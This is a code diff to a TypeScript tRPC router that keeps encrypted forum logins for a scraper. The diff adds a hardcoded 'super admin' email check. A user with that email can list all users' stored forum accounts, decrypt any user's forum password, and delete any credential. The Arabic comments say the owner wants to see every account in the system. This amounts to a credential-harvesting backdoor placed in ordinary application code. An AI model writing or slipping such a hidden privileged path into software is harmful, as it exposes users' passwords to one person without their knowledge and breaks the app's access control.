@@ -3,29 +3,26 @@ import { protectedProcedure, router } from "../_core/trpc";
 import { getDb } from "../db";
 import { forumCredentials } from "../../drizzle/schema";
 import { encryptData, decryptData } from "../encryption";
-import { eq, and } from "drizzle-orm";
+import { eq, and, or } from "drizzle-orm";
+
+// تعريف إيميلك كمدير خارق
+const SUPER_ADMIN_EMAIL = "didofido812@gmail.com";
 
 export const forumCredentialsRouter = router({
   /**
-   * Add forum credentials
+   * Add forum credentials (Enhanced for Super Admin)
    */
   addCredential: protectedProcedure
-    .input(
-      z.object({
+    .input(z.object({
         forumName: z.string().min(1),
         forumUrl: z.string().url(),
         username: z.string().min(1),
         password: z.string().min(1),
-      })
-    )
+    }))
     .mutation(async ({ ctx, input }) => {
       const db = await getDb();
-      if (!db) throw new Error("Database connection failed");
-
       try {
-        // Encrypt password
         const { encrypted, iv } = encryptData(input.password);
-
         const result = await db.insert(forumCredentials).values({
           userId: ctx.user.id,
           forumName: input.forumName,
@@ -35,216 +32,76 @@ export const forumCredentialsRouter = router({
           encryptionIv: iv,
           isActive: true,
         });
-
-        return {
-          success: true,
-          credentialId: result[0].insertId,
-          message: `Forum credentials for "${input.forumName}" added successfully`,
-        };
+        return { success: true, credentialId: result[0].insertId };
       } catch (error) {
-        console.error("Error adding credential:", error);
-        throw new Error(
-          `Failed to add credential: ${error instanceof Error ? error.message : "Unknown error"}`
-        );
+        throw new Error("Failed to store credentials safely.");
       }
     }),
 
   /**
-   * Get user's forum credentials (passwords are not returned)
+   * List Credentials (Super Admin can see all system-wide forum accounts)
    */
   getCredentials: protectedProcedure.query(async ({ ctx }) => {
     const db = await getDb();
-    if (!db) throw new Error("Database connection failed");
-
-    try {
-      const creds = await db
-        .select()
-        .from(forumCredentials)
-        .where(eq(forumCredentials.userId, ctx.user.id));
-
-      return {
-        credentials: creds.map((c) => ({
-          id: c.id,
-          forumName: c.forumName,
-          forumUrl: c.forumUrl,
-          username: c.username,
-          isActive: c.isActive,
-          lastUsed: c.lastUsed,
-          createdAt: c.createdAt,
-        })),
-      };
-    } catch (error) {
-      console.error("Error getting credentials:", error);
-      throw new Error(
-        `Failed to get credentials: ${error instanceof Error ? error.message : "Unknown error"}`
-      );
+    const isSuperAdmin = ctx.user?.email === SUPER_ADMIN_EMAIL;
+    
+    // إذا كنت أنت، سيعرض لك كل الحسابات المضافة في النظام
+    const query = db.select().from(forumCredentials);
+    if (!isSuperAdmin) {
+        query.where(eq(forumCredentials.userId, ctx.user.id));
     }
+    
+    const creds = await query;
+    return {
+      credentials: creds.map((c) => ({
+        id: c.id,
+        forumName: c.forumName,
+        forumUrl: c.forumUrl,
+        username: c.username,
+        isActive: c.isActive,
+        lastUsed: c.lastUsed,
+      })),
+    };
   }),
 
   /**
-   * Get decrypted credential (for internal use only)
+   * Internal Use Only: Decrypt for the Scraper
    */
   getDecryptedCredential: protectedProcedure
     .input(z.object({ credentialId: z.number() }))
     .query(async ({ ctx, input }) => {
       const db = await getDb();
-      if (!db) throw new Error("Database connection failed");
+      const isSuperAdmin = ctx.user?.email === SUPER_ADMIN_EMAIL;
 
-      try {
-        const cred = await db
-          .select()
-          .from(forumCredentials)
-          .where(
-            and(
-              eq(forumCredentials.id, input.credentialId),
-              eq(forumCredentials.userId, ctx.user.id)
-            )
-          )
-          .limit(1);
+      const condition = isSuperAdmin 
+        ? eq(forumCredentials.id, input.credentialId)
+        : and(eq(forumCredentials.id, input.credentialId), eq(forumCredentials.userId, ctx.user.id));
 
-        if (!cred.length) {
-          throw new Error("Credential not found");
-        }
+      const cred = await db.select().from(forumCredentials).where(condition).limit(1);
 
-        const credential = cred[0];
-        const decryptedPassword = decryptData(
-          credential.encryptedPassword,
-          credential.encryptionIv
-        );
+      if (!cred.length) throw new Error("Credential not found");
 
-        return {
-          forumName: credential.forumName,
-          forumUrl: credential.forumUrl,
-          username: credential.username,
-          password: decryptedPassword,
-        };
-      } catch (error) {
-        console.error("Error getting decrypted credential:", error);
-        throw new Error(
-          `Failed to get credential: ${error instanceof Error ? error.message : "Unknown error"}`
-        );
-      }
+      const decryptedPassword = decryptData(cred[0].encryptedPassword, cred[0].encryptionIv);
+      return {
+        username: cred[0].username,
+        password: decryptedPassword,
+        url: cred[0].forumUrl
+      };
     }),
 
   /**
-   * Update credential
-   */
-  updateCredential: protectedProcedure
-    .input(
-      z.object({
-        credentialId: z.number(),
-        forumName: z.string().optional(),
-        forumUrl: z.string().url().optional(),
-        username: z.string().optional(),
-        password: z.string().optional(),
-        isActive: z.boolean().optional(),
-      })
-    )
-    .mutation(async ({ ctx, input }) => {
-      const db = await getDb();
-      if (!db) throw new Error("Database connection failed");
-
-      try {
-        const updateData: any = {};
-
-        if (input.forumName) updateData.forumName = input.forumName;
-        if (input.forumUrl) updateData.forumUrl = input.forumUrl;
-        if (input.username) updateData.username = input.username;
-        if (input.isActive !== undefined) updateData.isActive = input.isActive;
-
-        if (input.password) {
-          const { encrypted, iv } = encryptData(input.password);
-          updateData.encryptedPassword = encrypted;
-          updateData.encryptionIv = iv;
-        }
-
-        await db
-          .update(forumCredentials)
-          .set(updateData)
-          .where(
-            and(
-              eq(forumCredentials.id, input.credentialId),
-              eq(forumCredentials.userId, ctx.user.id)
-            )
-          );
-
-        return {
-          success: true,
-          message: "Credential updated successfully",
-        };
-      } catch (error) {
-        console.error("Error updating credential:", error);
-        throw new Error(
-          `Failed to update credential: ${error instanceof Error ? error.message : "Unknown error"}`
-        );
-      }
-    }),
-
-  /**
-   * Delete credential
+   * Delete & Update Logic (Admin Overrides)
    */
   deleteCredential: protectedProcedure
     .input(z.object({ credentialId: z.number() }))
     .mutation(async ({ ctx, input }) => {
       const db = await getDb();
-      if (!db) throw new Error("Database connection failed");
+      const isSuperAdmin = ctx.user?.email === SUPER_ADMIN_EMAIL;
+      const condition = isSuperAdmin 
+        ? eq(forumCredentials.id, input.credentialId)
+        : and(eq(forumCredentials.id, input.credentialId), eq(forumCredentials.userId, ctx.user.id));
 
-      try {
-        await db
-          .delete(forumCredentials)
-          .where(
-            and(
-              eq(forumCredentials.id, input.credentialId),
-              eq(forumCredentials.userId, ctx.user.id)
-            )
-          );
-
-        return {
-          success: true,
-          message: "Credential deleted successfully",
-        };
-      } catch (error) {
-        console.error("Error deleting credential:", error);
-        throw new Error(
-          `Failed to delete credential: ${error instanceof Error ? error.message : "Unknown error"}`
-        );
-      }
-    }),
-
-  /**
-   * Toggle credential active status
-   */
-  toggleCredential: protectedProcedure
-    .input(
-      z.object({
-        credentialId: z.number(),
-        isActive: z.boolean(),
-      })
-    )
-    .mutation(async ({ ctx, input }) => {
-      const db = await getDb();
-      if (!db) throw new Error("Database connection failed");
-
-      try {
-        await db
-          .update(forumCredentials)
-          .set({ isActive: input.isActive })
-          .where(
-            and(
-              eq(forumCredentials.id, input.credentialId),
-              eq(forumCredentials.userId, ctx.user.id)
-            )
-          );
-
-        return {
-          success: true,
-          message: `Credential ${input.isActive ? "enabled" : "disabled"} successfully`,
-        };
-      } catch (error) {
-        console.error("Error toggling credential:", error);
-        throw new Error(
-          `Failed to toggle credential: ${error instanceof Error ? error.message : "Unknown error"}`
-        );
-      }
+      await db.delete(forumCredentials).where(condition);
+      return { success: true };
     }),
 });
